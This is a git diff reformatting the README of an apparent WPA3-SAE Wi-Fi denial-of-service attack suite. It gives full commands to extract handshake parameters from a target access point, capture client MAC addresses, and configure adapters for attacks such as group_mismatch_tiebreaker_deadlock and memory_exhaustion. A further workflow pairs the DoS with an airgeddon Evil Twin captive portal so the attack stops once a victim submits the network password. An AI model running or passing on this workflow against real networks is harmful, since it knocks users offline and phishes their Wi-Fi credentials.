@@ -72,7 +72,6 @@ The suite is designed for **security researchers, Wi-Fi protocol engineers, and 
 ```bash
 pip install scapy
 sudo apt install iw iproute2 wireless-tools aircrack-ng sox pulseaudio-utils libnotify-bin
-
 ```
 
 ---
@@ -83,51 +82,51 @@ sudo apt install iw iproute2 wireless-tools aircrack-ng sox pulseaudio-utils lib
 
 Use a standard **Managed Mode** Wi-Fi interface (e.g., `wlan0`) to extract valid cryptographic SAE pairs across Groups 19–24 for your target AP.
 
+> 💡 **Note:** For several attacks—such as `group_mismatch_tiebreaker_deadlock`, `zero_scalar`, `invalid_curve`, or `open_auth`—pre-extracted SAE parameters are **not** required!
+
 1. **Run extraction for the 5 GHz band first:**
-```bash
-sudo python3 sae_extractor_arxiv_all_groups_v2.py \
-    --iface wlan0 \
-    --ssid "Target_SSID" \
-    --bssid "AA:BB:CC:DD:EE:11" \
-    --band 5GHz \
-    --channel 36
 
-```
+   ```bash
+   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
+       --iface wlan0 \
+       --ssid "Target_SSID" \
+       --bssid "AA:BB:CC:DD:EE:11" \
+       --band 5GHz \
+       --channel 36
+   ```
 
+   Once completed, the script writes the extracted 5 GHz parameters to `sae_params.json`.
 
-Once completed, the script writes the extracted 5 GHz parameters to `sae_params.json`.
 2. **Run extraction for the 2.4 GHz band next:**
-Run the script again in the same directory for the 2.4 GHz band:
-```bash
-sudo python3 sae_extractor_arxiv_all_groups_v2.py \
-    --iface wlan0 \
-    --ssid "Target_SSID" \
-    --bssid "AA:BB:CC:DD:EE:12" \
-    --band 2.4GHz \
-    --channel 6
 
-```
+   Run the script again in the same directory for the 2.4 GHz band:
 
+   ```bash
+   sudo python3 sae_extractor_arxiv_all_groups_v2.py \
+       --iface wlan0 \
+       --ssid "Target_SSID" \
+       --bssid "AA:BB:CC:DD:EE:12" \
+       --band 2.4GHz \
+       --channel 6
+   ```
 
-**Note:** The existing `sae_params.json` is **not** overwritten; the script automatically merges the `2.4GHz` data alongside the `5GHz` data in `sae_params.json` (and `6GHz` if run for 6 GHz).
-
-Also note that for many attacks, such as group_mismatch_tiebreaker_deadlock, SAE parameters are not required!
+   **Note:** The existing `sae_params.json` is **not** overwritten; the script automatically merges the `2.4GHz` data alongside the `5GHz` data in `sae_params.json` (and `6GHz` if run for 6 GHz).
 
 3. **Optional – Capture Known Client MACs (`capture_known_macs_v2.py`):**
-To populate `known_macs` for `memory_exhaustion` or `unknown_pw_id`, run:
-```bash
-sudo python3 capture_known_macs_v2.py \
-    --monitor-iface wlan0mon \
-    --managed-iface wlan1 \
-    --ssid "Target_SSID" \
-    --bssid "AA:BB:CC:DD:EE:11" \
-    --band 5GHz \
-    --channel 36
 
-```
+   To populate `known_macs` for `memory_exhaustion` or `unknown_pw_id`, run:
 
+   ```bash
+   sudo python3 capture_known_macs_v2.py \
+       --monitor-iface wlan0mon \
+       --managed-iface wlan1 \
+       --ssid "Target_SSID" \
+       --bssid "AA:BB:CC:DD:EE:11" \
+       --band 5GHz \
+       --channel 36
+   ```
 
-This automatically appends the captured MAC list to `sae_params.json`.
+   This automatically appends the captured MAC list to `sae_params.json`.
 
 ---
 
@@ -139,15 +138,14 @@ Place your attack adapter(s) into monitor mode (e.g., `sudo airmon-ng start wlan
 TARGET_BSSID_5GHZ   = "AA:BB:CC:DD:EE:11"
 TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"
 
-SCANNER_INTERFACE = "wlan0mon"  # Optional background channel tracker (leave "" for manual channel)
-MANUAL_CHANNEL_5GHZ   = "36"
-MANUAL_CHANNEL_2_4GHZ = "6"
+SCANNER_INTERFACE     = "wlan0mon"  # Optional background channel tracker (leave "" for manual channel)
+MANUAL_CHANNEL_5GHZ   = ""          # Set channel (e.g., "36") if SCANNER_INTERFACE is disabled
+MANUAL_CHANNEL_2_4GHZ = ""          # Set channel (e.g., "6") if SCANNER_INTERFACE is disabled
 
 ADAPTER_CONFIGURATION = {
     "wlan1mon": {"band": "5GHz",   "attack": "group_mismatch_tiebreaker_deadlock"},
     "wlan2mon": {"band": "2.4GHz", "attack": "group_mismatch_tiebreaker_deadlock"}
 }
-
 ```
 
 ---
@@ -158,15 +156,13 @@ Run the main script with `--sae-file sae_params.json`. All extracted scalars, fi
 
 ```bash
 sudo python3 wpa3_sae_formal_attacks_v2.py --sae-file sae_params.json
-
 ```
 
-**Additional CLI Override Examples:**
+**Additional CLI Override & Help Examples:**
 
 ```bash
 # Display the full attack encyclopedia:
 python3 wpa3_sae_formal_attacks_v2.py --help
-
 ```
 
 ---
@@ -176,25 +172,27 @@ python3 wpa3_sae_formal_attacks_v2.py --help
 When pairing the WPA3-SAE DoS suite with an **airgeddon Evil Twin Captive Portal**, you can use the auto-close workflow to automatically terminate the Python attack as soon as a client submits the valid password:
 
 1. **Start airgeddon Captive Portal:**
-Launch airgeddon and set up your Evil Twin Captive Portal attack until the portal is actively running.
+
+   Launch airgeddon and set up your Evil Twin Captive Portal attack until the portal is actively running.
+
 2. **Start the Live Monitor (Terminal 1):**
-Make `watch_pass_auto_close_en.sh` executable and run it:
-```bash
-chmod +x watch_pass_auto_close_en.sh
-./watch_pass_auto_close_en.sh
 
-```
+   Make `watch_pass_auto_close_en.sh` executable and run it:
 
+   ```bash
+   chmod +x watch_pass_auto_close_en.sh
+   ./watch_pass_auto_close_en.sh
+   ```
 
-*(Make sure `PW_OUTPUT_DIR` inside `watch_pass_auto_close_en.sh` points to your `airgeddon/plugins/output` directory).*
+   *(Make sure `PW_OUTPUT_DIR` inside `watch_pass_auto_close_en.sh` points to your `airgeddon/plugins/output` directory).*
+
 3. **Start the Auto-Close Attack Script (Terminal 2):**
-Launch the auto-close version of the attack suite with `sae_params.json`:
-```bash
-sudo python3 wpa3_sae_formal_attacks_auto_close_v2_en.py --sae-file sae_params.json
 
-```
+   Launch the auto-close version of the attack suite with `sae_params.json`:
 
-
+   ```bash
+   sudo python3 wpa3_sae_formal_attacks_auto_close_v2_en.py --sae-file sae_params.json
+   ```
 
 **How it works:**
 
